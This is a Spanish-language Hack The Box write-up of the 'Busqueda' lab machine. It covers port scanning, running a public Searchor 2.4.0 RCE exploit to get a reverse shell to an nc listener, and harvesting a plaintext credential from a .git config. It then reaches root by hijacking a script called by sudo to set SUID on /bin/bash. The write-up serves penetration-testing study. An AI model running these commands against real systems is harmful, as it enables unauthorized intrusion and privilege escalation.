---
title: Writeup busqueda - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - busqueda
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina busqueda en Hack The Box.
keywords:
  - writeup busqueda
  - hack the box busqueda
  - resolución máquina busqueda
  - busqueda hack the box
  - htb busqueda
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Busqueda)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=QMIQ5e4sjVQ)|[Parte2](https://www.youtube.com/watch?v=DztFFuapoDU)
- 🧠 **Explicación resumida**: 

---

#nmap #ping #easy #linux #startlab #/etc/hosts #whatweb #wappalyzer #searchor240 #git #gitclone #nc-nlvp443 #tratamientotty #cd #filehijacking #cd #ls #nano #chmod

----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

Se puede utilizar la version automatizada que tenemos creada con [[startlab]] o si no de forma manual con los siguientes comandos

```shell
ping -c 1 IP
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn IP -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -pPuertos IP -oN targetTCP
nmap -sU -n -Pn --top-ports 200 IP -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -pPuertos IP -oN targetUDP
```

*TTL:* Maquina Linux

*Puertos  TCP:*
	`22` [[ssh]]
	`80` HTTP
	
*Puertos UDP:*
	Solamente esta abierto el 68 de dhcpc y no nos sirve

![[Busqueda6.png]]
![[Busqueda7.png]]
![[Busqueda8.png]]

------
# Agregamos dominio al /etc/hosts

Vemos que la pagina nos envia a searcher.htb asi que lo vamos a cargar en el /etc/hosts
![[Busqueda1.png]]![[Busqueda2.png]]
```
10.129.88.165 searcher.htb
```

![[Busqueda4.png]]

Y listo ahora si nos carga la pagina

![[Busqueda5.png]]

------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://searcher.htb/
```

![[Busqueda9.png]]
![[Busqueda10.png]]
Ninguna informacion relevante


-------
# Intrusion a la maquina por [[searchor 2.4.0]]

Vemos al final de la pagina que esta corriendo searchor 2.4.0
![[Busqueda13.png]]

Asi que con [[git clone]] vamos a usar ``git clone https://github.com/twisted007/Searchor_2.4.0_RCE_Python`` para descargar el repositorio, luego con [[cd]] usamos `cd Searchor_2.4.0_RCE_Python` para entrar a la carpeta y ejecutamos el exploit `python3 searchor-2_4_0_RCE.py searcher.htb 10.10.16.84 443`
En los parametros vamos a colocar la pagina web victima y luego la ip/puerto donde vamos a estar en escucha con [[nc -nlvp 443]] para recibir la [[Reverse shell]]



![[Busqueda14.png]]

![[Busqueda15.png]]
Ya estamos dentro de la maquina victima como el usuario *svc*

-----
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios con [[File hijacking]]

Listamos todos los archivos con [[ls]] usamos `ls la` y vemos el directorio *.git* entramos con [[cd]] usando el comando `cd .git` y luego listamos con `ls` para ver el archivo *config* que lo vamos a abrir con [[cat]] usando `cat config`
![[Busqueda39.png]]

http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
Vemos estas credenciales: ``cody:jh1usoih2bkjaspwe92``

La contraseña *jh1usoih2bkjaspwe92* la vamos a reutilizar para el usuario *svc*

Ahora vamos a listar los permisos de [[sudo]] con `sudo -l`
![[Busqueda24.png]]
Nos dice que podemos utilizar el siguiente binario como root

```
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Si ejecutamos el binario vemos que tenemos parametros que podemos utilizar
Cuando usamos el full-checkup `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` nos dice "Sometings went wrong"

![[Busqueda41.png]]


![[Busqueda42.png]]
![[Busqueda43.png]]

Pero si nos vamos a directorio */opt/scripts* donde dice que esta el *system-checkup* y se ejecuta
Asi que viendo los archivos del directorio con [[ls]] vemos que tenemos un full-checkup.sh

Sacamos la conclusion de que la opcion de *full-checkup.sh* se ejecuta archivos que tengan ese nombre y buscando el archivo en el directorio actual de trabajo. Por lo tanto vamos a hacer un [[File hijacking]]

### [[File hijacking]]

Vamos a ir a la carpeta /tmp usando `cd /tmp` y creamos un archivo con [[nano]] usando `nano full-checkup.sh`. Y al archivo le vamos a poner el siguiente contenido

```
#!/bin/sh
chmod u+s /bin/bash
```
Esto lo hacemos para hacer que sea [[SUID]]
![[Busqueda45.png]]

Ahora le damos permisos de ejecucion al archivo con [[chmod]] usando `chmod +x full-checkup.sh`
![[Busqueda46.png]]

Solamente nos queda ejecutar nuevamente el binario `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` y ejecutamos la bash con privilegios usando `bash -p`. Y listo ya somos root y podemos catear la flag
![[Busqueda49.png]]
![[Busqueda50.png]]